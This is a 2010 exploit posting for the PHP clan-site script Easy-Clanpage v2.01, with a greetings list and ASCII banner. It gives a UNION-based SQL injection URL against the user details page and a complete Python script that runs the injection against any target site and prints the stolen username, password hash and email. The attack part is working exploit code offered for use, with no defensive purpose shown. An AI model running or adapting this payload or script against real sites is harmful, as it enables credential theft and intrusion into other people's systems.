----------------------------Information------------------------------------------------
+Name : Easy-Clanpage <= v2.01 SQL Injection Exploit
+Autor : Easy Laster
+Date   : 25.03.2010
+Script Easy-Clanpage <= v2.01
+Download : Update Version 2.0->2.01 : http://www.easy-clanpage.de/?section=
downloads&action=viewdl&id=13
+Price : for free
+Language : PHP
+Discovered by Easy Laster
+Security Group 4004-Security-Project
+Greetz to Team-Internet ,Underground Agents
+And all Friends of Cyberlive : R!p,Eddy14,Silent Vapor,Nolok,
Kiba,-tmh-,Dr Chaos,HANN!BAL,Kabel,-=Player=-,Lidloses_Auge,
N00bor,Ic3Drag0n,novaca!ne.

---------------------------------------------------------------------------------------

 ___ ___ ___ ___                         _ _           _____           _         _
| | |   |   | | |___ ___ ___ ___ _ _ ___|_| |_ _ _ ___|  _  |___ ___  |_|___ ___| |_
|_  | | | | |_  |___|_ -| -_|  _| | |  _| |  _| | |___|   __|  _| . | | | -_|  _|  _|
  |_|___|___| |_|   |___|___|___|___|_| |_|_| |_  |   |__|  |_| |___|_| |___|___|_|
                                              |___|                 |___|


----------------------------------------------------------------------------------------
+Vulnerability : http://www.site.com/Easy-Clanpage/?section=user&action=details&id=

#SQL Injection
+Exploitable   : http://www.site.com/Easy-Clanpage/?section=user&action=details&id=1
+union+select+concat(username,0x3a,password,0x3a,email)+from+ecp_user+where+userID=1--
-----------------------------------------------------------------------------------------

#SQL Injection Exploit

#!/usr/bin/env python
#-*- coding:utf-8 -*-
import sys, urllib2, re

if len(sys.argv) < 2:
    print "***************************************************************"
    print "************ Easy-Clanpage v2.01 Profil Page Hack *************"
    print "***************************************************************"
    print "*         Discovered and vulnerability by Easy Laster         *"
    print "*                      coded by Dr.ChAoS                      *"
    print "*                                                             *"
    print "*                        <=Usage=>                            *"
    print "* python exploit.py http://site.de/ecp/ <userid, default=1>   *"
    print "*                                                             *"
    print "***************************************************************"
    exit()

if len(sys.argv) < 3:
    id = 1
else:
    id = sys.argv[2]

site = sys.argv[1]
if site[-1:] != "/":
    site += "/"

url = site + "index.php?section=user&action=details&id=1+and+1=0+union+select+concat(0x23,0x23,0x23,0x23,0x23,username,0x3a,password,0x3a,email,0x23,0x23,0x23,0x23,0x23)+from+ecp_user+where+userID=" + str(id) + "--"

print "Exploiting..."

html = urllib2.urlopen(url).read()
# I hate regex!
data = re.findall(r"#####(.*)\:([0-9a-fA-F]{32})\:(.*)#####\:", html)
if len(data) > 0:
    print "Success!\n"
    print "ID: " + str(id)
    print "Username: " + data[0][0]
    print "Password: " + data[0][1]
    print "E-Mail: " + data[0][2]
    print "\nHave a nice day!"
else:
    print "Exploit failed..."